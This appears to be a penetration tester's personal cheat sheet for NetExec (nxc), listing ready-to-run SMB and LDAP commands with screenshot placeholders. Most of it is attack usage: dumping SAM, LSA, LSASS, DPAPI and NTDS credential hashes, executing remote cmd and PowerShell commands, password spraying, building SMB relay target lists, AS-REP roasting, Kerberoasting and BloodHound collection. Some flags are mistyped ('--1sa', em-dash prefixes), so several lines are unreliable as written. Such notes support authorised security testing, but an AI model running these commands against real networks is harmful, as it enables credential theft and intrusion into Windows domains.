# About
NetExec (a.k.a nxc) is a network service exploitation tool that helps automate assessing the security of _large_ networks. Usable for multiple protocols, such as smb, ssh, ldap, ftp, wmi, winrm, rdp, vnc, mssql, and nfs.
## Links
[Github](https://github.com/Pennyw0rth/NetExec)
[Github Download](https://github.com/Pennyw0rth/NetExec/releases/)
[WIki](https://www.netexec.wiki/)
https://www.hackingarticles.in/active-directory-pentesting-using-netexec-tool-a-complete-guide/
# Usage
Logging
```
nxc PROTOCOL IP -u 'USER' -p 'PASSWORD' --log
```
## SMB
General host info
```
nxc smb targets.txt
```
![[Pasted image 20250925191935.png]]

Enumerate Users
```
nxc smb IP -u USER -p 'PASSWORD' --users
nxc smb IP -u USER -p 'PASSWORD' --users-export users.txt
```
![[Pasted image 20250925192457.png]]

See what AV/EDR is running
```
nxc smb IP -u USER -p 'PASSWORD' -M enum_av
```
![[Pasted image 20250925192608.png]]

Generate a list of relayable hosts (SMB Signing disabled)
```
nxc smb up-hosts.txt --gen-relay-list relay.txt
```
![[Pasted image 20250925192711.png]]

Enumerate shares
```
nxc smb ip -u 'USER' -p 'PASSWORD' --shares
```
![[Pasted image 20250909132757.png]]

Dumping hashes
```
nxc smb IP -u username -p password --sam
nxc smb IP -u username -p password --1sa
nxc smb IP -u username -p password -M lsassy
nxc smb IP -u username -p password --dpapi
nxc smb IP -u username -p password --ntds
nxc smb IP -u username -p password —-ntds —user Administrator
```
![[Pasted image 20250909132804.png]]
![[Pasted image 20250909132808.png]]
![[Pasted image 20250909132831.png]]

Pass cmd
```
nxc smb ip -u 'USER' -p <passwordt> -x 'command'
```
![[Pasted image 20250909132813.png]]

Pass powershell
```
nxc smb ip -u 'USER' -p 'PASSWORD' -X 'command'
```
![[Pasted image 20250909132818.png]]

Look at domain admins
```
nxc smb ip -u 'USER' -p 'PASSWORD' -x 'net group "Domain Admins" /domain'
```

Look at logged on users
```
nxc smb ip -u 'USER' -p 'PASSWORD' --loggedon-users
```
![[Pasted image 20250909132828.png]]

View password policy
```
nxc smb dc-ip -u 'USER' -p 'password' --pass-pol
```
![[Pasted image 20250925192844.png]]

Enumerate SMB Shares testing for anonymous access
```
nxc smb targets.txt --shares --no-bruteforce
```

Perform a password spray
```
nxc smb IP -u users.txt -p 'Password123!' --continue-on-success
nxc smb IP -u users.txt -p passwords. txt --continue-on-success
nxc smb IP -u userl user2 user3 -p Summer18
nxc smb IP -u userl -p passwordl password2 password3
nxc smb IP -u user.txt -p user.txt —no-bruteforce --continue-on-success
nxc smb IP -u user.txt -p password.txt —-no-bruteforce —-continue-on-success
nxc smb IP -u user.txt -p password.txt —-no-bruteforce —-continue-on-success -d DELAY-#-IN-MINUTES
```
## LDAP
Check for misconfigured Delegation
```
nxc ldap IP -u username -p password --find-delegation
```
![[Pasted image 20250925192945.png]]
Machine Account Quota - Created rogue machine account for escalation
```
nxc ldap IP -u username -p password -M maq
```

Enumerate Users/Groups
```
nxc ldap IP -u username -p password --users
nxc ldap IP -u username -p password --active-users
nxc ldap IP -u username -p password --groups
nxc ldap IP -u username -p password --groups 'Domain Admins'
```
![[Pasted image 20250925193041.png]]
![[Pasted image 20250925193111.png]]

Test if an Account Exists without Kerberos.
	When using the option `-k` or `–use-kcache`, you need to specify the same hostname (FQDN) as the one from the kerberos ticket
```
nxc ldap <ldap-server> -u "'USER'.txt" -p '' -k
```

Test credentials
```
nxc ldap <ldap-server> -u 'USER' -p 'PASSWORD'
```
![[Pasted image 20250909132722.png]]

With valid creds, Enumerate users
```
nxc ldap <ldap-server> -u 'USER' -p 'PASSWORD' –-users
```
![[Pasted image 20250909132727.png]]

ASREPRoasting exploits accounts that do not require Kerberos pre-authentication to extract service ticket hashes, which can then be cracked offline.
```
nxc ldap <ldap-server> -u 'USER' -p '' --asreproast <output.txt>
```

With a list of users
```
nxc ldap <ldap-server> -u users.txt -p '' --asreproast output.txt
```

Kerberoasting extracts service account hashes by requesting service tickets for accounts with SPNs (Service Principal Names).
```
nxc ldap <ldap-server> -u 'USER' -p 'PASSWORD' --kerberoasting hash.txt
```
![[Pasted image 20250909132741.png]]

BloodHound ingestor is used to collect data for use in BloodHound, a tool for mapping AD attack paths.
```
nxc ldap <ldap-server> -u 'USER' -p 'PASSWORD' --bloodhound --collection All --dns-server <ldap-server>
```
![[Pasted image 20250909132747.png]]